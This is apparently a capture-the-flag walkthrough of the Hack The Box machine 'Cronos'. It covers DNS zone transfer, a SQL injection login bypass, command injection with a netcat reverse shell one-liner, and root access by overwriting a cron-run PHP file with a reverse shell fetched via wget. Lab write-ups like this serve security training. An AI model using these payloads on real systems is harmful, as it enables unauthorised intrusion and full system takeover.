# Cronos

## Cronos

Cronos was a medium linux box that required gaining access to a code execution site through dns searching and sql injection. This was then used to gain a shell on the system and read the user flag. Root required some enumeration to find the `/etc/crontab` file which we can abuse to gain a root shell with php.

> Skills involved in this box:

* enumeration
* privelage escalation
* dns searching using dig
* SQL 

## USER

As always we start off with an nmap scan:

```bash
kali@kali:~/boxes/cronos$ nmap -sC -sV -o nmap 10.10.10.13
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-27 04:51 EDT
Nmap scan report for 10.10.10.13
Host is up (0.036s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.08 seconds
```

The scan shows port 22 open on ssh even though it is not needed for this box. Port 80 fo http and port 53 open on tcp which we can use to try ad find subdomains for the host later.

We visit the page at http and find a default apache page. We quickly add `cronos.htb` to our hosts and refresh the page. We now get a normal website which doesnt seem too interesting.

We run directory brute-force tools such as gobuster but we dont find anything.

Instead we use `dig` to try and find any subdomains on `cronos.htb`:

```bash
kali@kali:~/boxes/cronos$ dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.16.3-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
www.cronos.htb.         604800  IN      A       10.10.10.13
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 20 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Sat Jun 27 04:55:32 EDT 2020
;; XFR size: 7 records (messages 1, bytes 203)
```

We Add all of theese to our hosts file which now looks like this: `10.10.10.13 cronos.htb www.cronos.htb ns1.cronos.htb admin.cronos.htb`

Navigating to `admin.cronos.htb` we find a login page, We try and guess common passwords but none of which work.

We then try to use SQL Injection to try and bypass the login page and it worked.

We used the username: `admin' OR 1=1 -- -` and we left the password field blank and we manage to login succesfully.

Now it shows us the title `Net Tool v0.1` and we can execute commands via the execute section where it allows us to ping an ip address.

It lets us ping an ip so we try to ping our own to see if we get a connection and it works.

we intercept the request with burpe to see whats going on.

`command=ping+-c+1&host=10.10.xx.xx` - this is basically what it shows when executing the command, we can try edit this command to get code execution with anything such as `whoami` or `id`.

We then drop the request and go back to the page and see if we can get a reverse shell.

`10.10.xx.xx; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1234 >/tmp/f`

We enter this into the command bar and setup a listener and we get a shell.

From here we can then go on to read the user flag.

```bash
kali@kali:~/boxes/cronos$ nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.13] 51974
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ which python
/usr/bin/python
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@cronos:/var/www/admin$ cd /home
cd /home
www-data@cronos:/home$ ls
ls
noulis
www-data@cronos:/home$ cd noulis
cd noulis
www-data@cronos:/home/noulis$ ls
ls
user.txt
www-data@cronos:/home/noulis$ cat user.txt
cat user.txt
51d236438b333970dbba7dc3089be33b
```

## ROOT

By running linenum.sh on the system we find an interesting file on it called `/etc/crontab`.

```bash
ww-data@cronos:/home/noulis$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
```

We can see that this file is being ran as root, lets see if we can exploit it.

We see that it is running `/var/www/laravel/artisan` as root with php meaning its a php file. Lets try and add a reverse shell to the file and see if it executes it.

```bash
kali@kali:~$ python -m SimpleHTTPServer 8081
Serving HTTP on 0.0.0.0 port 8081 ...
10.10.10.13 - - [27/Jun/2020 05:12:20] "GET /php-reverse-shell.php HTTP/1.1" 200 -
```

We setup a python server to host our rev-shell file\(which is edited to include our ip and port\)

```bash
www-data@cronos:/tmp$ wget 10.10.14.7:8081/php-reverse-shell.php
wget 10.10.14.7:8081/php-reverse-shell.php
--2020-06-27 12:15:48--  http://10.10.14.7:8081/php-reverse-shell.php
Connecting to 10.10.14.7:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5492 (5.4K) [application/octet-stream]
Saving to: 'php-reverse-shell.php'

php-reverse-shell.p 100%[===================>]   5.36K  --.-KB/s    in 0.003s  

2020-06-27 12:15:48 (1.63 MB/s) - 'php-reverse-shell.php' saved [5492/5492]

www-data@cronos:/tmp$

www-data@cronos:/var/www/laravel$ cp /tmp/php-reverse-shell.php artisan
cp /tmp/php-reverse-shell.php artisan
```

Now we just set up a listener on the specified port that we added in our shell file and wait for a connection.

```bash
kali@kali:~$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.13] 46434
Linux cronos 4.4.0-72-generic #93-Ubuntu SMP Fri Mar 31 14:07:41 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 12:18:01 up 24 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cat /root/root.txt
1703b8a3c9a8dde879942c79d02fd3a0
```

Thanks for reading hope you enjoyed.

